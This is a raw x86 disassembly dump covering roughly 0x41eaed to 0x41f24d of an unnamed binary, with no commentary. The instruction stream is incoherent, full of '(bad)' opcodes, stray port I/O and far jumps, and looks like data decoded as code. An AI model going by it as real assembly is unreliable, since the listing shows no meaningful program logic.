  41eaed:	ja     0x41eae0
  41eaef:	test   DWORD PTR [esi-0x2a64d0a2],0x0
  41eaf9:	add    dl,dl
  41eafb:	or     BYTE PTR [esi-0x7e8afd],0xb0
  41eb02:	dec    eax
  41eb03:	(bad)
  41eb07:	mov    eax,eax
  41eb09:	shl    BYTE PTR [ebx+0x7a1f8b08],cl
  41eb0f:	and    edi,0xffffffec
  41eb12:	inc    eax
  41eb14:	xor    dh,BYTE PTR [eax+ecx*8-0x3e62bd79]
  41eb1b:	jne    0x41eb8f
  41eb1d:	in     eax,dx
  41eb1e:	cmp    cl,al
  41eb20:	xor    bl,BYTE PTR [ebp+0x1d328a1e]
  41eb26:	addr16 ret 0xd2ff
  41eb2a:	stc    
  41eb2b:	jne    0x41eb02
  41eb2d:	fs mov ecx,0x32622eef
  41eb33:	cld    
  41eb34:	sub    BYTE PTR [edx],ch
  41eb36:	hlt    
  41eb37:	pop    ebx
  41eb38:	add    ch,BYTE PTR [edx+0x5a]
  41eb3b:	add    al,0x0
  41eb3d:	daa    
  41eb3e:	cmp    dl,BYTE PTR [eax-0x1a]
  41eb41:	pusha  
  41eb42:	xor    dl,BYTE PTR [ecx+0x73]
  41eb45:	loope  0x41eb34
  41eb47:	ror    BYTE PTR [ebx],1
  41eb49:	jb     0x41eaf7
  41eb4b:	jbe    0x41eb9f
  41eb4d:	stc    
  41eb4e:	sbb    al,0x74
  41eb50:	data16 in al,dx
  41eb52:	sti    
  41eb53:	rcl    bl,0xb9
  41eb56:	inc    ebp
  41eb57:	jmp    0x75bf:0x80c306fc
  41eb5e:	add    BYTE PTR [eax],al
  41eb60:	add    BYTE PTR [eax],al
  41eb62:	add    BYTE PTR [ebp+0x7b],dh
  41eb65:	jp     0x41eb58
  41eb67:	sub    DWORD PTR [ecx+0x7726ed42],ecx
  41eb6d:	jb     0x41eb54
  41eb6f:	or     al,0x16
  41eb71:	push   ecx
  41eb72:	push   ebx
  41eb73:	jo     0x41ebeb
  41eb75:	adc    ah,BYTE PTR [ecx]
  41eb77:	xchg   dl,al
  41eb79:	jmp    DWORD PTR [ecx-0x45]
  41eb7c:	imul   ebx,DWORD PTR [ebp+0x0],0x25
  41eb80:	ret    0x8
  41eb83:	imul   ecx,DWORD PTR [ecx+0x4c6f51e8],0xfbc06853
  41eb8d:	(bad)  
  41eb8e:	jmp    DWORD PTR [esi+0x6]
  41eb91:	sti    
  41eb92:	xor    eax,0x3fca0c
  41eb97:	iret   
  41eb98:	fiadd  DWORD PTR [ebp+0x11f6f05d]
  41eb9e:	aam    0xbe
  41eba0:	aas    
  41eba1:	cld    
  41eba2:	mov    cl,BYTE PTR [edx+edi*1]
  41eba5:	out    dx,eax
  41eba6:	nop/reserved BYTE PTR [esp+edi*8+0x398a8cff]
  41ebae:	int3   
  41ebaf:	jl     0x41ebf0
  41ebb1:	cld    
  41ebb2:	push   edx
  41ebb3:	sub    dl,BYTE PTR [edx+0x66]
  41ebb6:	add    DWORD PTR [edi],ebp
  41ebb8:	div    BYTE PTR [ecx+0x1c]
  41ebbb:	fwait
  41ebbc:	std    
  41ebbd:	daa    
  41ebbe:	add    BYTE PTR [edi+edi*8-0x6],cl
  41ebc2:	jne    0x41ec08
  41ebc4:	not    bl
  41ebc6:	test   DWORD PTR [eax],eax
  41ebc8:	add    BYTE PTR [eax],al
  41ebca:	add    BYTE PTR [eax],al
  41ebcc:	pushf  
  41ebcd:	push   es
  41ebce:	test   BYTE PTR [ebp+0x52ffff4c],bl
  41ebd4:	cli    
  41ebd5:	push   ecx
  41ebd6:	add    di,bp
  41ebd9:	cmc    
  41ebda:	jno    0x41ebf8
  41ebdc:	sub    DWORD PTR [esp+eax*1-0x1],0x6b
  41ebe1:	jl     0x41eb9f
  41ebe3:	js     0x1d41e867
  41ebe9:	div    BYTE PTR [ecx+0x1c]
  41ebec:	add    ecx,DWORD PTR ds:0xfecc10bc
  41ebf2:	cli    
  41ebf3:	jbe    0x41ebf9
  41ebf5:	test   BYTE PTR [ecx],bh
  41ebf7:	fs jmp 0x182e:0x7588fc3e
  41ebff:	std    
  41ec00:	retf   0x8d31
  41ec03:	(bad)  
  41ec04:	push   0xfffffff4
  41ec06:	ror    DWORD PTR ds:0x86cba1ca,0x3b
  41ec0d:	popa   
  41ec0e:	in     al,dx
  41ec0f:	or     eax,0x740440f6
  41ec14:	ins    BYTE PTR es:[edi],dx
  41ec15:	call   0x7a69ff85
  41ec1a:	jmp    0x555d:0x8b609e1f
  41ec21:	dec    DWORD PTR [ebx]
  41ec23:	xchg   DWORD PTR [ebx],edi
  41ec25:	inc    ebp
  41ec26:	fsub   DWORD PTR [ebp-0x4]
  41ec29:	sbb    cl,BYTE PTR [edx]
  41ec2b:	or     eax,0xd0a22c2
  41ec30:	add    BYTE PTR [eax],al
  41ec32:	add    BYTE PTR [eax],al
  41ec34:	add    dl,dl
  41ec36:	sbb    al,BYTE PTR [eax]
  41ec38:	or     eax,0x809b29ca
  41ec3d:	push   edi
  41ec3e:	imul   eax,DWORD PTR ds:0x4d434c2,0x8d396250
  41ec48:	jp     0x41ecb3
  41ec4a:	mov    ds:0xf269458b,al
  41ec4f:	(bad)  [edi]
  41ec51:	mov    ?,WORD PTR [eax+esi*8]
  41ec54:	add    esp,ebp
  41ec56:	js     0x41ecd1
  41ec58:	jb     0x41ecb7
  41ec5a:	sub    bh,ch
  41ec5c:	adc    esi,DWORD PTR [edx]
  41ec5e:	xchg   edi,eax
  41ec5f:	adc    BYTE PTR [ecx-0x3d],dl
  41ec62:	sbb    bh,ch
  41ec64:	pop    es
  41ec65:	and    dh,BYTE PTR [edi+0x48]
  41ec68:	lgs    ebx,FWORD PTR [ebx-0x75]
  41ec6c:	inc    edx
  41ec6d:	adc    DWORD PTR [ebp+0x45],eax
  41ec70:	jae    0x41ece3
  41ec72:	mov    ah,0x7d
  41ec74:	jb     0x41ecdf
  41ec76:	cdq    
  41ec77:	push   0xe5032b8b
  41ec7c:	jp     0x41ec29
  41ec7e:	iret   
  41ec7f:	cli    
  41ec80:	out    dx,eax
  41ec81:	jae    0x41ecf4
  41ec83:	pop    ebx
  41ec84:	sbb    al,ah
  41ec86:	pop    ss
  41ec87:	mov    edx,DWORD PTR [ebx]
  41ec89:	xor    eax,0xcec07202
  41ec8e:	rcr    DWORD PTR [edi+ebx*8],1
  41ec91:	mov    bl,0x44
  41ec93:	into   
  41ec94:	add    ebp,esp
  41ec96:	enter  0x80e2,0x0
  41ec9a:	add    BYTE PTR [eax],al
  41ec9c:	add    BYTE PTR [eax],al
  41ec9e:	cli    
  41ec9f:	div    cl
  41eca1:	shl    DWORD PTR [ecx+0x35146b17],cl
  41eca7:	add    ch,BYTE PTR [edx-0x1f]
  41ecaa:	jbe    0x41ecae
  41ecac:	bound  eax,QWORD PTR [ecx]
  41ecae:	test   BYTE PTR [edx-0x6],0xd
  41ecb2:	and    eax,0x6407d371
  41ecb7:	ret    0x86e6
  41ecba:	pop    eax
  41ecbb:	add    ch,BYTE PTR [edx-0x18fa9515]
  41ecc1:	add    ebx,ebp
  41ecc3:	mov    bl,cl
  41ecc5:	(bad)  
  41ecc6:	push   0x69
  41ecc8:	mov    ds,WORD PTR [edi+0x7b197163]
  41ecce:	repz out dx,al
  41ecd0:	inc    esi
  41ecd1:	mov    edi,cs
  41ecd3:	dec    esi
  41ecd4:	rol    BYTE PTR ds:0xc063d9a0,1
  41ecda:	and    dl,dl
  41ecdc:	sub    eax,0xdb716ef0
  41ece1:	das    
  41ece2:	dec    ecx
  41ece3:	(bad)
  41ece6:	sub    DWORD PTR [ebp-0x25],edi
  41ece9:	jnp    0x41ec6f
  41eceb:	ret    0x7ae6
  41ecee:	inc    eax
  41ecef:	xchg   DWORD PTR [esi],esp
  41ecf1:	lock jns 0x41ed28
  41ecf4:	daa    
  41ecf5:	ins    BYTE PTR es:[edi],dx
  41ecf6:	sbb    al,0x2
  41ecf8:	add    cl,ch
  41ecfa:	jbe    0x41ecd8
  41ecfc:	add    DWORD PTR [esi-0x3abd83d9],edx
  41ed02:	add    BYTE PTR [eax],al
  41ed04:	add    BYTE PTR [eax],al
  41ed06:	add    cl,cl
  41ed08:	ins    DWORD PTR es:[edi],dx
  41ed09:	jb     0x41ecf8
  41ed0b:	ins    DWORD PTR es:[edi],dx
  41ed0c:	xor    al,0x38
  41ed0e:	mov    ebp,0xce6670b8
  41ed13:	pop    esp
  41ed14:	push   edi
  41ed15:	sub    BYTE PTR [ecx-0xa98af3b],0x7e
  41ed1c:	add    al,BYTE PTR [eax]
  41ed1e:	inc    ebx
  41ed1f:	jno    0x41ed90
  41ed21:	xor    bh,BYTE PTR [ecx-0x5a003dd5]
  41ed27:	adc    BYTE PTR [esi+0x11],0x29
  41ed2b:	jno    0x41eda8
  41ed2d:	xlat   BYTE PTR ds:[ebx]
  41ed2e:	pusha  
  41ed2f:	retf   0x3858
  41ed32:	scas   al,BYTE PTR es:[edi]
  41ed33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed34:	inc    esp
  41ed35:	imul   ebp,eax,0xe8ff6dce
  41ed3b:	jbe    0x41ed97
  41ed3d:	jbe    0x41ed9d
  41ed3f:	jns    0x41ed43
  41ed41:	mov    dl,ch
  41ed43:	mov    ebp,0x76e90820
  41ed48:	xchg   DWORD PTR [eax-0x1b],edi
  41ed4b:	mov    ch,0xc2
  41ed4d:	or     esi,esi
  41ed4f:	jbe    0x41ed53
  41ed51:	add    BYTE PTR [eax+esi*1+0x0],bl
  41ed55:	push   eax
  41ed56:	push   ecx
  41ed57:	sbb    BYTE PTR [ecx-0x3b061701],dh
  41ed5d:	fbld   TBYTE PTR [eax+0x38]
  41ed60:	sub    al,0x89
  41ed62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed63:	mov    ds:0xfba94088,al
  41ed68:	mov    ah,0xe1
  41ed6a:	sbb    eax,0x0
  41ed6f:	add    BYTE PTR [esi+ebp*2+0x6ef7b3e7],ch
  41ed76:	cld    
  41ed77:	mov    ecx,0x816a8e
  41ed7c:	jnp    0x41ed67
  41ed7e:	mov    ch,0xee
  41ed80:	sbb    eax,0x528b0004
  41ed85:	(bad)  
  41ed86:	cld    
  41ed87:	dec    esp
  41ed89:	cmp    al,0x71
  41ed8b:	stc    
  41ed8c:	and    esi,ecx
  41ed8e:	int3   
  41ed8f:	dec    bl
  41ed91:	jmp    0xd787:0x3cc0000
  41ed98:	push   edi
  41ed99:	test   BYTE PTR [ecx-0x416137b],0xff
  41eda0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eda1:	into   
  41eda2:	mov    dh,0x0
  41eda4:	int3   
  41eda5:	rol    DWORD PTR [ecx+0xf],0xcd
  41eda9:	xchg   BYTE PTR [ecx-0x4],ah
  41edac:	pushf  
  41edad:	jle    0x41ee20
  41edaf:	or     BYTE PTR [ebx],cl
  41edb1:	jb     0x41edb7
  41edb3:	push   0xffffff8c
  41edb5:	jmp    0x1640:0xeb0472
  41edbc:	pop    esp
  41edbd:	push   es
  41edbe:	jg     0x41ed84
  41edc0:	cwde   
  41edc1:	push   edx
  41edc2:	dec    edi
  41edc3:	inc    DWORD PTR [edx-0x37ea0491]
  41edc9:	adc    DWORD PTR [eax+0x0],eax
  41edcc:	fild   QWORD PTR [edi]
  41edce:	or     DWORD PTR [ebx-0x140408e7],eax
  41edd4:	add    BYTE PTR [eax],al
  41edd6:	add    BYTE PTR [eax],al
  41edd8:	add    BYTE PTR [esi+0x36],bl
  41eddb:	rol    BYTE PTR [eax-0x71],0x7e
  41eddf:	popa   
  41ede0:	call   0x4d9e87
  41ede5:	fisttp WORD PTR [eax-0x8]
  41ede8:	call   edi
  41edea:	pop    eax
  41edeb:	aam    0x53
  41eded:	mov    ah,0x28
  41edef:	leave  
  41edf0:	(bad)  
  41edf1:	pop    ebx
  41edf2:	jge    0x41ee35
  41edf4:	je     0x75438dcb
  41edfa:	pop    ecx
  41edfb:	inc    edx
  41edfc:	pop    es
  41edfd:	jne    0x41edb5
  41edff:	mov    ebp,ebx
  41ee01:	hlt    
  41ee02:	adc    al,0xe1
  41ee04:	add    dh,BYTE PTR [ebp+0x59]
  41ee07:	into   
  41ee08:	push   esp
  41ee09:	lock xor eax,0x5ffaf9a1
  41ee0f:	imul   esi,DWORD PTR [ecx+0x1a],0x60887468
  41ee16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee17:	jmp    0x41ee78
  41ee19:	js     0x41ee74
  41ee1b:	add    BYTE PTR [ecx+0x5003c2b2],cl
  41ee21:	ror    BYTE PTR [ebp-0x40],cl
  41ee24:	adc    eax,0xc3815935
  41ee29:	jno    0x41ee09
  41ee2b:	pop    eax
  41ee2c:	jae    0x41eea5
  41ee2e:	loop   0x41ee60
  41ee30:	xor    DWORD PTR [ebp+0x7a5c6ddd],esi
  41ee36:	cmc    
  41ee37:	inc    ebx
  41ee38:	pop    ebp
  41ee39:	lods   al,BYTE PTR ds:[esi]
  41ee3a:	fwait
  41ee3b:	jmp    0x41ee60
  41ee3d:	add    BYTE PTR [eax],al
  41ee3f:	add    BYTE PTR [eax],al
  41ee41:	add    BYTE PTR [ecx+ebx*2+0x0],dh
  41ee45:	push   0xffc16bfd
  41ee4a:	xchg   edx,eax
  41ee4b:	sbb    al,0xa1
  41ee4d:	inc    BYTE PTR [edx+0x188659ab]
  41ee53:	jns    0x41eddb
  41ee55:	inc    edx
  41ee56:	dec    ecx
  41ee57:	lods   al,BYTE PTR ds:[esi]
  41ee58:	jne    0x41ee6c
  41ee5a:	mov    ebp,0xb2ffc069
  41ee5f:	aam    0xe
  41ee61:	push   esp
  41ee62:	xchg   BYTE PTR [ebx+0x27b88700],bl
  41ee68:	cmp    ecx,eax
  41ee6a:	jp     0x41ee53
  41ee6c:	adc    edi,edi
  41ee6e:	inc    edx
  41ee6f:	pop    esp
  41ee70:	cmp    ebx,DWORD PTR [ebx+0x21]
  41ee73:	sahf   
  41ee74:	aaa    
  41ee75:	mov    DWORD PTR [eax+0x668b4302],edi
  41ee7b:	mov    ah,BYTE PTR [ebx+0x6e]
  41ee7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee7f:	sbb    al,BYTE PTR [ecx-0x6ac572ff]
  41ee85:	ret    
  41ee86:	adc    bl,al
  41ee88:	add    eax,0xa711e111
  41ee8d:	add    esi,esi
  41ee8f:	inc    edx
  41ee90:	jnp    0x41ee9f
  41ee92:	out    dx,al
  41ee93:	aam    0xe2
  41ee95:	mov    BYTE PTR [edi+0x4a],ch
  41ee98:	into   
  41ee99:	lea    esi,[edi+0x2]
  41ee9c:	out    0x80,eax
  41ee9e:	and    bh,al
  41eea0:	in     eax,dx
  41eea1:	mov    dh,BYTE PTR [edi]
  41eea3:	dec    edx
  41eea4:	arpl   WORD PTR [ebx+0x0],ax
  41eea7:	add    BYTE PTR [eax],al
  41eea9:	add    BYTE PTR [eax],al
  41eeab:	inc    edi
  41eeac:	cli    
  41eead:	sub    DWORD PTR [ebx],edi
  41eeaf:	cs push esi
  41eeb1:	cmp    cl,BYTE PTR [ebp+ecx*8+0x1]
  41eeb5:	pusha  
  41eeb6:	rcr    BYTE PTR [edx-0x4ea7cc93],0x17
  41eebd:	jae    0x41eed0
  41eebf:	xor    eax,0xc2f86a02
  41eec4:	add    ah,dh
  41eec6:	jg     0x41eea5
  41eec8:	add    ah,bh
  41eeca:	add    esi,esp
  41eecc:	out    dx,eax
  41eecd:	xchg   BYTE PTR [esi+0x79],dh
  41eed0:	xchg   BYTE PTR [edi],dh
  41eed2:	add    esi,DWORD PTR [ebp+0x2]
  41eed5:	xor    eax,0xe7026503
  41eeda:	int    0x5a
  41eedc:	sbb    DWORD PTR [ebx],esi
  41eede:	jne    0x41ef49
  41eee0:	jns    0x41ef40
  41eee2:	mov    edi,ds
  41eee4:	dec    edx
  41eee5:	imul   esi,DWORD PTR [esi+0x69],0xffffff86
  41eee9:	outs   dx,DWORD PTR ds:[esi]
  41eeea:	add    esi,DWORD PTR [ebp+0x2]
  41eeed:	popf   
  41eeee:	jmp    0xea28ca3d
  41eef3:	jbe    0x41eebe
  41eef5:	call   FWORD PTR [ecx+0x2edff0c3]
  41eefb:	test   DWORD PTR [esi],ecx
  41eefd:	adc    ch,BYTE PTR [ecx+0x3d428576]
  41ef03:	cmc    
  41ef04:	lods   al,BYTE PTR ds:[esi]
  41ef05:	jae    0x41eeb2
  41ef07:	neg    edi
  41ef09:	sti    
  41ef0a:	jmp    0x696ac4f
  41ef0f:	add    BYTE PTR [eax],al
  41ef11:	add    BYTE PTR [eax],al
  41ef13:	add    BYTE PTR [ebp+0x2e],ah
  41ef16:	push   ss
  41ef17:	test   eax,0xe5c38376
  41ef1c:	jmp    0x6931baa8
  41ef21:	outs   dx,BYTE PTR ds:[esi]
  41ef22:	mov    BYTE PTR [edi+0x648a3dfc],bh
  41ef28:	sub    eax,0x49d6fc6f
  41ef2d:	into   
  41ef2e:	mov    ecx,0x4a8376e9
  41ef33:	lds    eax,FWORD PTR [eax+0x5a]
  41ef36:	or     eax,0xc12d36fa
  41ef3b:	bound  ebx,QWORD PTR [edx+0x2d1c8064]
  41ef41:	outs   dx,BYTE PTR ds:[esi]
  41ef42:	mov    BYTE PTR [ecx+ecx*2],ah
  41ef45:	outs   dx,BYTE PTR ds:[esi]
  41ef46:	jb     0x41ef05
  41ef48:	sub    BYTE PTR [eax],dl
  41ef4a:	mov    eax,?
  41ef4c:	mov    dh,0x6c
  41ef4e:	mov    ah,0xd9
  41ef50:	jle    0x41ef54
  41ef52:	add    al,al
  41ef54:	leave  
  41ef55:	add    BYTE PTR [esp+ebp*8-0x4f],dh
  41ef59:	jns    0x41efb5
  41ef5b:	loope  0x41ef6b
  41ef5d:	xlat   BYTE PTR ds:[ebx]
  41ef5e:	add    cl,ch
  41ef60:	jbe    0x41efda
  41ef62:	xlat   BYTE PTR ds:[ebx]
  41ef63:	push   edx
  41ef64:	adc    edx,0x4525e54
  41ef6a:	std    
  41ef6b:	cld    
  41ef6c:	mov    ds:0xf5e94014,al
  41ef71:	aas    
  41ef72:	or     eax,DWORD PTR [eax]
  41ef74:	iret   
  41ef75:	call   DWORD PTR [edx-0x18]
  41ef78:	add    BYTE PTR [eax],al
  41ef7a:	add    BYTE PTR [eax],al
  41ef7c:	add    dl,cl
  41ef7e:	mov    ecx,0xc9c8fffa
  41ef83:	jo     0x41ef92
  41ef85:	arpl   WORD PTR [ebx-0x24],bx
  41ef88:	jmp    FWORD PTR [ecx]
  41ef8a:	add    al,0xf
  41ef8c:	inc    eax
  41ef8d:	or     al,0xb0
  41ef8f:	std    
  41ef90:	jmp    0xa1f3:0xe8c0320e
  41ef97:	std    
  41ef98:	call   FWORD PTR [esi+0x2]
  41ef9b:	add    BYTE PTR [eax+esi*8],dh
  41ef9e:	popf   
  41ef9f:	push   ecx
  41efa0:	test   DWORD PTR [ebx],esp
  41efa2:	retf   
  41efa3:	ss inc ebp
  41efa5:	jns    0x41efef
  41efa7:	shl    BYTE PTR [edx],cl
  41efa9:	or     eax,0x32bae105
  41efae:	add    al,0xf2
  41efb0:	jno    0x41efe2
  41efb2:	mov    eax,ds:0x8cc53c3a
  41efb7:	and    eax,0xcd257be5
  41efbc:	push   ebx
  41efbd:	jnp    0x41ef70
  41efbf:	sub    DWORD PTR [ecx-0x55],esp
  41efc2:	dec    ecx
  41efc3:	push   edx
  41efc4:	sbb    al,0xf3
  41efc6:	dec    edx
  41efc7:	lahf   
  41efc8:	addr16 js 0x41efd6
  41efcb:	fidivr DWORD PTR [esi+0x1d]
  41efce:	push   ebx
  41efcf:	push   ecx
  41efd0:	push   ds
  41efd1:	imul   DWORD PTR [ecx+eiz*4-0x15eb6f7a]
  41efd8:	in     al,0xbb
  41efda:	and    eax,0x469431cd
  41efdf:	push   ds
  41efe0:	jno    0x41efe2
  41efe2:	add    BYTE PTR [eax],al
  41efe4:	add    BYTE PTR [eax],al
  41efe6:	sub    ecx,DWORD PTR [ecx+0x59]
  41efe9:	es mov ebx,0xc51512d6
  41efef:	enter  0x9e2a,0xdf
  41eff3:	push   edx
  41eff4:	mov    eax,0x9d8c759e
  41eff9:	shl    BYTE PTR [ebp+edx*8+0x495fd616],0x4b
  41f001:	mov    DWORD PTR [eax+0x5b64ae84],edi
  41f007:	push   ecx
  41f008:	popf   
  41f009:	mov    ebx,0xf1523fa8
  41f00e:	loop   0x41f00a
  41f010:	(bad)  
  41f011:	aad    0x64
  41f013:	xor    eax,0xe8098282
  41f018:	repnz icebp 
  41f01a:	pop    ss
  41f01b:	lods   al,BYTE PTR ds:[esi]
  41f01c:	popf   
  41f01d:	cmp    eax,0x269ca7cf
  41f022:	and    cl,BYTE PTR [ebx+ecx*4-0x69886b6e]
  41f029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f02a:	ins    BYTE PTR es:[edi],dx
  41f02b:	jg     0x41f03f
  41f02d:	repnz ins BYTE PTR es:[edi],dx
  41f02f:	mov    edi,?
  41f031:	mov    BYTE PTR es:[eax-0x135c23b],bl
  41f038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f039:	fld    DWORD PTR es:[ebx]
  41f03c:	xlat   BYTE PTR ds:[ebx]
  41f03d:	inc    eax
  41f03e:	adc    al,0xa6
  41f040:	mov    ah,BYTE PTR [eax-0xde642b3]
  41f046:	inc    esp
  41f047:	lea    ecx,[ebp+0xaf]
  41f04d:	add    BYTE PTR [eax],al
  41f04f:	popf   
  41f050:	inc    edx
  41f051:	pop    eax
  41f052:	xchg   ecx,eax
  41f053:	xor    BYTE PTR [ebp+edi*8-0x58fc80c3],bh
  41f05a:	outs   dx,BYTE PTR es:[esi]
  41f05c:	jnp    0x41f004
  41f05e:	mov    eax,ds:0x91588838
  41f063:	xor    ah,dl
  41f065:	std    
  41f066:	cmp    eax,0x26a43b4a
  41f06b:	nop
  41f06c:	cmp    esp,DWORD PTR [ecx]
  41f06e:	ret    0x634d
  41f071:	int    0xd5
  41f073:	aam    0x2
  41f075:	rcl    DWORD PTR [ecx],1
  41f077:	addr16 and al,0xce
  41f07a:	lds    eax,FWORD PTR [eax]
  41f07c:	sbb    edi,DWORD PTR [ecx-0x5c]
  41f07f:	xchg   ecx,eax
  41f080:	pop    ds
  41f081:	out    dx,eax
  41f082:	test   al,0x93
  41f084:	push   esi
  41f085:	mov    edx,esi
  41f087:	cmp    BYTE PTR [eax+edi*2],dh
  41f08a:	mov    dh,0x29
  41f08c:	icebp  
  41f08d:	dec    esp
  41f08e:	into   
  41f08f:	les    esp,FWORD PTR [ebx+0x1fcdbc59]
  41f095:	sub    bh,BYTE PTR [esi-0x76399d08]
  41f09b:	inc    ecx
  41f09c:	in     al,0xd
  41f09e:	add    ebp,esi
  41f0a0:	jnp    0x41f0b1
  41f0a2:	push   es
  41f0a3:	and    esp,esp
  41f0a5:	lahf   
  41f0a6:	mov    bh,0x29
  41f0a8:	in     al,0x5
  41f0aa:	add    BYTE PTR [edi+ebx*1-0x404edd6],bl
  41f0b1:	in     eax,0x7e
  41f0b3:	add    BYTE PTR [eax],al
  41f0b5:	add    BYTE PTR [eax],al
  41f0b7:	add    BYTE PTR [edi],al
  41f0b9:	in     al,0xfe
  41f0bb:	ret    0xf1cc
  41f0be:	test   ebp,ecx
  41f0c0:	inc    edi
  41f0c1:	lahf   
  41f0c2:	rcr    DWORD PTR [edx-0x1c],0xbf
  41f0c6:	test   DWORD PTR [ebp-0x48],edx
  41f0c9:	and    edx,DWORD PTR [eax-0x3bac6ede]
  41f0cf:	or     ch,ch
  41f0d1:	sub    al,0x43
  41f0d3:	mov    bl,0xfd
  41f0d5:	inc    esp
  41f0d6:	loop   0x41f0db
  41f0d8:	inc    esi
  41f0d9:	jge    0x41f06d
  41f0db:	test   BYTE PTR [esi+0x7503e696],cl
  41f0e1:	aad    0x3c
  41f0e3:	fistp  DWORD PTR [esi+esi*8]
  41f0e6:	pop    ebx
  41f0e7:	enter  0xdaa2,0x56
  41f0eb:	inc    eax
  41f0ec:	xor    eax,0xb84eba02
  41f0f1:	add    al,BYTE PTR [eax]
  41f0f3:	fnstenv [esi+0x2]
  41f0f6:	push   eax
  41f0f7:	pusha  
  41f0f8:	inc    ebp
  41f0f9:	jno    0x41f081
  41f0fb:	(bad)  
  41f0fd:	data16 adc bl,BYTE PTR ds:0x69ffc27f
  41f104:	mov    edx,0x23b750fd
  41f109:	loope  0x41f10e
  41f10b:	jmp    0xa4cceb86
  41f110:	scas   al,BYTE PTR es:[edi]
  41f111:	mov    ecx,0xc4bf3669
  41f116:	fucomip st,st(0)
  41f118:	jbe    0x41f11c
  41f11a:	add    BYTE PTR [esi],ah
  41f11c:	add    BYTE PTR [eax],al
  41f11e:	add    BYTE PTR [eax],al
  41f120:	add    BYTE PTR [ebp+0x6a],bh
  41f123:	pop    gs
  41f125:	jbe    0x41f1a2
  41f127:	mul    DWORD PTR [eax+0x5]
  41f12a:	jne    0x41f164
  41f12c:	adc    al,BYTE PTR [edx]
  41f12e:	or     dl,BYTE PTR [esi-0x66]
  41f131:	sub    ebx,ebx
  41f133:	add    eax,0x1c148796
  41f138:	(bad)  [esi+0x5ea48768]
  41f13e:	sub    al,cl
  41f140:	pop    esp
  41f141:	outs   dx,BYTE PTR ds:[esi]
  41f142:	jge    0x41f1b6
  41f144:	aad    0x39
  41f146:	jns    0x41f140
  41f148:	(bad)  
  41f149:	inc    esp
  41f14a:	jl     0x41f1be
  41f14c:	aad    0x29
  41f14e:	cmp    eax,0xc03344c6
  41f154:	push   ds
  41f155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f156:	leave  
  41f157:	(bad)  
  41f158:	stos   DWORD PTR es:[edi],eax
  41f159:	mov    cl,0x68
  41f15b:	mov    ah,0x99
  41f15d:	lods   al,BYTE PTR ds:[esi]
  41f15e:	sub    BYTE PTR [eax],al
  41f160:	loope  0x41f115
  41f162:	cld    
  41f163:	jb     0x41f149
  41f165:	into   
  41f166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f167:	jo     0x41f192
  41f169:	jns    0x41f13d
  41f16b:	push   esp
  41f16c:	add    DWORD PTR [ecx],edi
  41f16e:	out    dx,al
  41f16f:	aas    
  41f170:	add    BYTE PTR [ebp+ecx*2-0xc9f7a77],cl
  41f177:	sti    
  41f178:	dec    DWORD PTR [eax+ecx*2-0x4e0ba6e6]
  41f17f:	scas   eax,DWORD PTR es:[edi]
  41f180:	(bad)  
  41f181:	fstp   TBYTE PTR [ebp-0x40]
  41f184:	adc    al,0x0
  41f186:	add    BYTE PTR [eax],al
  41f188:	add    BYTE PTR [eax],al
  41f18a:	sar    DWORD PTR [esi+0x4436c271],1
  41f190:	mov    DWORD PTR [ebp-0x40],eax
  41f193:	dec    ebp
  41f194:	dec    esp
  41f195:	call   0x3f69bc
  41f19a:	aas    
  41f19b:	les    eax,FWORD PTR [ebp+0x79e7c05d]
  41f1a1:	call   0xd026f9d
  41f1a6:	mov    DWORD PTR [ebp+0x4e704589],0x4e8c4589
  41f1b0:	dec    edi
  41f1b1:	push   ebx
  41f1b2:	idiv   bh
  41f1b4:	imul   eax,DWORD PTR [ecx],0x85894edf
  41f1ba:	loopne 0x41f1ae
  41f1bc:	sti    
  41f1bd:	dec    DWORD PTR [ebx+esi*8]
  41f1c0:	jno    0x41f1ca
  41f1c2:	xchg   ebx,eax
  41f1c3:	aas    
  41f1c4:	mov    WORD PTR [esp+ecx*8+0x3],es
  41f1c8:	add    bh,bh
  41f1ca:	loope  0x41f173
  41f1cc:	or     eax,0xbc80dc40
  41f1d1:	jne    0x41f17e
  41f1d3:	call   0xe6e649
  41f1d8:	idiv   edi
  41f1da:	sti    
  41f1db:	in     eax,0xbf
  41f1dd:	jmp    0x3de346
  41f1e2:	(bad)  [eax-0x20]
  41f1e5:	lea    edx,[ecx-0x16]
  41f1e8:	dec    esp
  41f1e9:	call   0x3dc88f
  41f1ee:	add    BYTE PTR [eax],al
  41f1f0:	add    BYTE PTR [eax],al
  41f1f2:	add    BYTE PTR [ebp-0x2b],dh
  41f1f5:	inc    eax
  41f1f6:	jae    0x41f25d
  41f1f8:	js     0x41f1ef
  41f1fa:	out    0x82,eax
  41f1fc:	inc    esi
  41f1fd:	je     0x41f210
  41f1ff:	xor    eax,0x72f78359
  41f204:	add    dh,BYTE PTR gs:[ecx-0x1c0a278c]
  41f20b:	out    dx,al
  41f20c:	add    eax,0x59b51100
  41f211:	outs   dx,DWORD PTR ds:[esi]
  41f212:	aad    0x52
  41f214:	inc    esi
  41f215:	pop    eax
  41f216:	cld    
  41f217:	and    eax,esp
  41f219:	scas   eax,DWORD PTR es:[edi]
  41f21a:	push   edx
  41f21b:	out    dx,al
  41f21c:	int3   
  41f21d:	jnp    0x41f269
  41f21f:	ins    DWORD PTR es:[edi],dx
  41f220:	ficomp DWORD PTR [ebx+ecx*1+0x77]
  41f224:	pop    ecx
  41f225:	add    BYTE PTR [ecx-0x3d],dl
  41f228:	nop
  41f229:	xor    eax,eax
  41f22b:	popw   es
  41f22d:	pop    ecx
  41f22e:	das    
  41f22f:	push   ecx
  41f230:	pop    edx
  41f231:	add    BYTE PTR [ebx-0xae57acb],al
  41f237:	mov    ch,0x5d
  41f239:	add    BYTE PTR [eax],al
  41f23b:	jne    0x41f286
  41f23d:	hlt    
  41f23e:	push   cs
  41f23f:	out    dx,al
  41f240:	jo     0x41f1c5
  41f242:	not    BYTE PTR [edx-0x1c7d0515]
  41f248:	in     al,dx
  41f249:	add    al,0x39
  41f24b:	jae    0x41f214
  41f24d:	add    DWORD PTR [ecx+0x7bef3e5],ecx
